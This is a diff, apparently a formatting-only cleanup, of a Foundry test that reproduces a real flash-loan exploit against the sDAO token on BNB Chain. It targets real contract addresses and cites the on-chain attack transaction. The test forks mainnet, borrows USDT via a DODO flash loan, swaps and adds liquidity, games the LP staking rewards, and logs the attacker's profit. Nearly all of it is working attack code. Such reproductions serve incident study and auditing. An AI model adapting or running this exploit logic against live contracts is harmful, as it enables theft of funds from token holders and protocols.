@@ -10,19 +10,19 @@ import "./interface.sol";
 // @TX
 // https://bscscan.com/tx/0xb3ac111d294ea9dedfd99349304a9606df0b572d05da8cedf47ba169d10791ed
 
-interface sDAO is IERC20{
+interface sDAO is IERC20 {
     function stakeLP(uint256 _lpAmount) external;
     function withdrawTeam(address _token) external;
-    function getPerTokenReward() external view returns(uint);
-    function userLPStakeAmount(address account) external view returns(uint);
-    function userRewardPerTokenPaid(address account) external view returns(uint);
-    function totalStakeReward() external view returns(uint);
-    function lastTotalStakeReward() external view returns(uint);
-    function pendingToken(address account) external view returns(uint);
+    function getPerTokenReward() external view returns (uint256);
+    function userLPStakeAmount(address account) external view returns (uint256);
+    function userRewardPerTokenPaid(address account) external view returns (uint256);
+    function totalStakeReward() external view returns (uint256);
+    function lastTotalStakeReward() external view returns (uint256);
+    function pendingToken(address account) external view returns (uint256);
     function getReward() external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     sDAO SDAO = sDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
@@ -32,25 +32,21 @@ contract ContractTest is DSTest{
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 23241440);
+        cheats.createSelectFork("bsc", 23_241_440);
     }
 
-    function testExploit() public{
-        USDT.approve(address(Router), type(uint).max);
-        SDAO.approve(address(Router), type(uint).max);
-        Pair.approve(address(Router), type(uint).max);
-        Pair.approve(address(SDAO), type(uint).max);
-        SDAO.approve(address(this), type(uint).max);
+    function testExploit() public {
+        USDT.approve(address(Router), type(uint256).max);
+        SDAO.approve(address(Router), type(uint256).max);
+        Pair.approve(address(Router), type(uint256).max);
+        Pair.approve(address(SDAO), type(uint256).max);
+        SDAO.approve(address(this), type(uint256).max);
         DVM(dodo).flashLoan(0, 500 * 1e18, address(this), new bytes(1));
 
-        emit log_named_decimal_uint(
-            "[End] Attacker USDT balance after exploit",
-            USDT.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         USDTToSDAO();
         addUSDTsDAOLiquidity();
         SDAO.stakeLP(Pair.balanceOf(address(this)) / 2);
@@ -70,19 +66,15 @@ contract ContractTest is DSTest{
     }
 
     function USDTToSDAO() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(USDT);
         path[1] = address(SDAO);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            250 * 1e18,
-            0,
-            path,
-            address(this),
-            block.timestamp + 60
+            250 * 1e18, 0, path, address(this), block.timestamp + 60
         );
     }
 
-    function addUSDTsDAOLiquidity() internal{
+    function addUSDTsDAOLiquidity() internal {
         Router.addLiquidity(
             address(USDT),
             address(SDAO),
@@ -95,18 +87,12 @@ contract ContractTest is DSTest{
         );
     }
 
-
     function SDAOToUSDT() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(SDAO);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            SDAO.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 60
+            SDAO.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60
         );
     }
-
 }
